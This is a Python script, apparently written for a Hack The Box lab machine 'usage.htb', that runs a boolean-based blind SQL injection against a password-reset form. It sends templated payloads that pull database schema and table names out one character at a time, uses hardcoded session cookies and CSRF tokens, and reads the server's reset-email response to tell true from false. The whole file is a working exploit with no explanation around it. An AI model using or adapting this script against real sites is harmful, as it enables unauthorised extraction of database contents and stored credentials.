import asyncio
import aiohttp
from string import Template
import urllib

delay = 0.5
batch = 5
async def post(loop, url, data, headers, delay):
    try:
        print('Before waiting', delay)
        await asyncio.sleep(delay)
        print('After waiting')

        async with aiohttp.ClientSession(loop=loop) as session:
            async with session.post(url=url, data=data, headers=headers) as response:
                res = await response.text()
                #print(res)
                condFalse = 'Email address does not match in our records!'
                condTrue ='We have e-mailed your password reset link to'
                success = None
                if res.find('Page Expired') != -1:
                    print('Token expired')
                if res.find('Bad Gateway') != -1:
                    print('Bad SQL sintax')
                if res.find(condTrue) != -1:
                    success = True
                if res.find(condFalse) != -1:
                    success = False
                return success
    except Exception as e:
        print("Unable to get url {} due to {}.".format(url, e.__class__))


async def main(loop, url, payloads, headers, delay):
    ret = await asyncio.gather(*[post(loop, url, payloads[i], headers, delay*(i+1)) for i in range(len(payloads))])
    #print("Finalized all. ret is a list of len {} outputs.".format(len(ret)))
    
    print(ret)



url = 'http://usage.htb/forget-password'

base_payload = Template("a' OR (SELECT ascii(substring(($query),$index,1)))=$ascii;-- -")
payloads = [
    "SELECT group_concat(schema_name separator ',') FROM information_schema.schemata"
    ,f"SELECT group_concat(table_name separator ',') FROM information_schema.tables where table_schema = 'usage_blog'"
]
payloads2 = []
for i in range(1,batch+1):
    payloads2.append({"_token":"g7iSNlAKsAN5lKB4SbxnVRmvQXfigr2jbHHqhjuw","email": base_payload.substitute(query=payloads[0], index=i, ascii=105)})

for p in payloads2:
    pass
    #print(p)

#cookies = {
#    'laravel_session':'eyJpdiI6IlUvbGp6WTB6MUVtVjJJc0cxWTlQM3c9PSIsInZhbHVlIjoibkxBbTZhS0JEdDkwNGlqK3kxbjRtajROcHMvVkxDRGhoY2p3cEM0K1kwMi82U0V6S3VRYllGVGxJd2JTdkgzZU14clp0RzhWdEVnRitmUlAzS05oS0E1TDBiaUZucmR6K3hUZWphemcweGR4bmhJZ2ZMUzNDSzJ2UzhBRWVjejEiLCJtYWMiOiIyMjA3ZTRmOTNhNTViNDVjN2FjMzA0ZDdhOGIwZjZiYWFlNzM4NDNhYTc4NjYxYjVkMGQzMmVlYzhmNDVkM2ZmIiwidGFnIjoiIn0%3D'
#    ,'XSRF-TOKEN':'eyJpdiI6Ik84VmRCT2tuT0xWVGR5Yzhvd1FZRUE9PSIsInZhbHVlIjoiNXg4M0gxWFJOajYwL2Q1Q0thaU5qOThsWkp1U2NKTFdlc0hTWFVleU9wMWlaWEV2UmkvQTJCcnd6VVlBSGU1QVJweDlsd1RaaDdOMkZVYURTTCtqQUd1RG8wT0RGb0FOcEttYjc4Q2RLbDVkd3NuTk1naHdkZSthMHdwRXdIa1UiLCJtYWMiOiI0YjI1ZWM0Yzc0NDFmYmMwNzM2NGNhZjUxNjZlNmE0MGE0MzQwMWUxZDBjZDQyOTJjNzEwNGEyMDk1MWZkYjZjIiwidGFnIjoiIn0%3D'
#}
headers = {
    'Host': 'usage.htb'
    ,'User-Agent': 'blindsqli'
    ,'Content-Type': 'application/x-www-form-urlencoded'
    ,'Cookie': 'laravel_session=eyJpdiI6IlUvbGp6WTB6MUVtVjJJc0cxWTlQM3c9PSIsInZhbHVlIjoibkxBbTZhS0JEdDkwNGlqK3kxbjRtajROcHMvVkxDRGhoY2p3cEM0K1kwMi82U0V6S3VRYllGVGxJd2JTdkgzZU14clp0RzhWdEVnRitmUlAzS05oS0E1TDBiaUZucmR6K3hUZWphemcweGR4bmhJZ2ZMUzNDSzJ2UzhBRWVjejEiLCJtYWMiOiIyMjA3ZTRmOTNhNTViNDVjN2FjMzA0ZDdhOGIwZjZiYWFlNzM4NDNhYTc4NjYxYjVkMGQzMmVlYzhmNDVkM2ZmIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6Ik84VmRCT2tuT0xWVGR5Yzhvd1FZRUE9PSIsInZhbHVlIjoiNXg4M0gxWFJOajYwL2Q1Q0thaU5qOThsWkp1U2NKTFdlc0hTWFVleU9wMWlaWEV2UmkvQTJCcnd6VVlBSGU1QVJweDlsd1RaaDdOMkZVYURTTCtqQUd1RG8wT0RGb0FOcEttYjc4Q2RLbDVkd3NuTk1naHdkZSthMHdwRXdIa1UiLCJtYWMiOiI0YjI1ZWM0Yzc0NDFmYmMwNzM2NGNhZjUxNjZlNmE0MGE0MzQwMWUxZDBjZDQyOTJjNzEwNGEyMDk1MWZkYjZjIiwidGFnIjoiIn0%3D'
}


loop = asyncio.get_event_loop()
loop.run_until_complete(main(loop, url, payloads2, headers, delay))

#asyncio.run(main(url, payloads2, headers))

